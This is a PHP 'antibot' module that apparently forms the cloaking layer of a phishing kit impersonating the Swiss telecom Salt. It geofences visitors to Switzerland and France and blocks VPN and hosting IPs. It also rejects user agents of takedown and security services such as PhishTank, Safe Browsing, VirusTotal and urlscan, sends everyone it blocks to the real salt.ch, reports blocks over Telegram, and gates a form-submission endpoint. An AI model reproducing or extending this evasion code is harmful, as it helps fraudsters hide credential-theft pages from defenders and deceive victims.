<?php

declare(strict_types=1);

require_once __DIR__ . '/ip-blocklist.php';
require_once __DIR__ . '/antibot-ip.php';

function antibot_config(): array
{
    static $config = null;

    if ($config !== null) {
        return $config;
    }

    $defaults = [
        'enabled' => true,
        'redirect_url' => 'https://www.salt.ch/fr',
        'allowed_countries' => ['CH', 'FR'],
        'block_bad_user_agents' => true,
        'require_user_agent' => true,
        'block_vpn' => true,
        'block_hosting' => true,
        'block_bad_isp' => true,
        'block_corporate_asn' => true,
        'require_residential' => false,
        'fail_closed' => true,
        'notify_blocks' => true,
        'require_js_verify' => true,
        'min_seconds_before_notify' => 20,
        'max_page_views_per_minute' => 40,
        'max_notify_per_hour' => 8,
        'max_clicks_per_hour' => 15,
    ];

    $path = dirname(__DIR__, 2) . '/config/antibot.php';
    if (!is_file($path)) {
        $config = $defaults;
        return $config;
    }

    $loaded = require $path;
    $config = is_array($loaded) ? array_merge($defaults, $loaded) : $defaults;

    return $config;
}

function antibot_enabled(): bool
{
    return !empty(antibot_config()['enabled']);
}

function antibot_client_ip(): string
{
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];

    foreach ($keys as $key) {
        if (empty($_SERVER[$key])) {
            continue;
        }
        $value = trim(explode(',', (string) $_SERVER[$key])[0]);
        if (filter_var($value, FILTER_VALIDATE_IP)) {
            return $value;
        }
    }

    return '0.0.0.0';
}

function antibot_init(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    if (!isset($_SESSION['salt_antibot_started'])) {
        $_SESSION['salt_antibot_started'] = time();
    }

    if (empty($_SESSION['salt_antibot_token'])) {
        $_SESSION['salt_antibot_token'] = bin2hex(random_bytes(16));
    }
}

function antibot_page_token(): string
{
    antibot_init();

    return (string) ($_SESSION['salt_antibot_token'] ?? '');
}

function antibot_is_verified(): bool
{
    return !empty($_SESSION['salt_antibot_verified']);
}

function antibot_mark_verified(): void
{
    antibot_init();
    $_SESSION['salt_antibot_verified'] = time();
}

function antibot_user_agent(): string
{
    return trim((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
}

function antibot_is_bad_user_agent(): bool
{
    $ua = strtolower(antibot_user_agent());

    if ($ua === '') {
        return true;
    }

    $patterns = [
        'bot', 'crawl', 'spider', 'slurp', 'wget', 'curl/', 'python-requests',
        'python-urllib', 'java/', 'libwww', 'scrapy', 'headless', 'phantomjs',
        'selenium', 'puppeteer', 'playwright', 'httpclient', 'go-http-client',
        'ahrefs', 'semrush', 'petalbot', 'bytespider', 'gptbot', 'claudebot',
        'gemini', 'copilot', 'perplexity',
        'bingpreview', 'bingbot', 'adidxbot', 'msnbot', 'microsoftpreview',
        'googlebot', 'adsbot-google', 'mediapartners-google', 'feedfetcher-google',
        'apis-google', 'google-inspectiontool', 'storebot-google', 'google-extended',
        'applebot', 'itunes', 'duckduckbot', 'yandexbot', 'baiduspider', 'sogou',
        'exabot', 'facebot', 'facebookexternalhit', 'meta-externalagent',
        'ia_archiver', 'archive.org', 'wayback', 'monitor', 'checker', 'scan',
        'lighthouse', 'pagespeed', 'gtmetrix', 'pingdom', 'uptimerobot', 'statuscake',
        'postman', 'insomnia', 'nikto', 'nmap', 'masscan', 'zgrab', 'censys',
        'netcraft', 'urlscan', 'virustotal', 'phishtank', 'safebrowsing',
        'trendmicro', 'kaspersky', 'symantec', 'mcafee', 'eset', 'sophos',
        'prtg', 'nagios', 'zabbix', 'datadog', 'newrelic', 'sentry', 'splunk',
        'headlesschrome', 'phantomjs', 'preview', 'prerender',
    ];

    foreach ($patterns as $pattern) {
        if (str_contains($ua, $pattern)) {
            return true;
        }
    }

    return false;
}

function antibot_rate_limit(string $bucket, int $max, int $windowSeconds): bool
{
    if ($max < 1) {
        return true;
    }

    $dir = dirname(__DIR__, 2) . '/data/ratelimit';
    if (!is_dir($dir) && !mkdir($dir, 0750, true) && !is_dir($dir)) {
        return true;
    }

    $file = $dir . '/' . hash('sha256', $bucket . '|' . antibot_client_ip()) . '.json';
    $now = time();
    $data = ['count' => 0, 'reset' => $now + $windowSeconds];

    if (is_file($file)) {
        $decoded = json_decode((string) file_get_contents($file), true);
        if (is_array($decoded)) {
            $data = $decoded;
        }
    }

    if ($now >= (int) ($data['reset'] ?? 0)) {
        $data = ['count' => 0, 'reset' => $now + $windowSeconds];
    }

    $data['count'] = (int) ($data['count'] ?? 0) + 1;
    file_put_contents($file, json_encode($data), LOCK_EX);

    return $data['count'] <= $max;
}

function antibot_notify_block_once(string $reason): void
{
    if (empty(antibot_config()['notify_blocks'])) {
        return;
    }

    if (!antibot_rate_limit('block_notify', 1, 300)) {
        return;
    }

    if (!function_exists('notify_antibot_redirect')) {
        require_once __DIR__ . '/telegram.php';
    }

    notify_antibot_redirect($reason, antibot_client_ip());
}

function antibot_redirect(string $reason): void
{
    antibot_notify_block_once($reason);

    $url = trim((string) (antibot_config()['redirect_url'] ?? 'https://www.salt.ch/fr'));
    if ($url === '') {
        $url = 'https://www.salt.ch/fr';
    }

    header('Location: ' . $url, true, 302);
    exit;
}

function antibot_deny(int $code = 403): void
{
    http_response_code($code);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => false, 'error' => 'forbidden']);
    exit;
}

function antibot_enforce_access(): void
{
    if (!antibot_enabled()) {
        return;
    }

    $reason = antibot_get_block_reason();
    if ($reason !== null) {
        antibot_redirect($reason);
    }
}

function antibot_check_page(): void
{
    if (!antibot_enabled()) {
        return;
    }

    antibot_enforce_access();

    $max = (int) antibot_config()['max_page_views_per_minute'];
    if (!antibot_rate_limit('page', $max, 60)) {
        antibot_redirect('rate_limit');
    }
}

function antibot_allow_click(): bool
{
    if (!antibot_enabled()) {
        return true;
    }

    return antibot_get_block_reason() === null;
}

function antibot_validate_token_from_request(): bool
{
    $header = trim((string) ($_SERVER['HTTP_X_SALT_TOKEN'] ?? ''));
    $token = antibot_page_token();

    return $header !== '' && $token !== '' && hash_equals($token, $header);
}

function antibot_check_notify(array $payload): void
{
    if (!antibot_enabled()) {
        return;
    }

    if (antibot_get_block_reason() !== null) {
        antibot_deny();
    }

    if (!empty($payload['_hp'])) {
        antibot_deny();
    }

    if (!antibot_validate_token_from_request()) {
        antibot_deny();
    }

    $config = antibot_config();

    if (!empty($config['require_js_verify']) && !antibot_is_verified()) {
        antibot_deny();
    }

    $minSeconds = (int) ($config['min_seconds_before_notify'] ?? 20);
    $started = (int) ($_SESSION['salt_antibot_started'] ?? 0);
    if ($started > 0 && (time() - $started) < $minSeconds) {
        antibot_deny();
    }

    $max = (int) ($config['max_notify_per_hour'] ?? 8);
    if (!antibot_rate_limit('notify', $max, 3600)) {
        antibot_deny(429);
    }
}

function antibot_handle_verify_request(): void
{
    header('Content-Type: application/json; charset=utf-8');

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(['ok' => false]);
        exit;
    }

    if (!antibot_enabled()) {
        echo json_encode(['ok' => true]);
        exit;
    }

    if (antibot_get_block_reason() !== null) {
        http_response_code(403);
        echo json_encode(['ok' => false]);
        exit;
    }

    if (!antibot_validate_token_from_request()) {
        http_response_code(403);
        echo json_encode(['ok' => false]);
        exit;
    }

    antibot_mark_verified();
    echo json_encode(['ok' => true]);
}
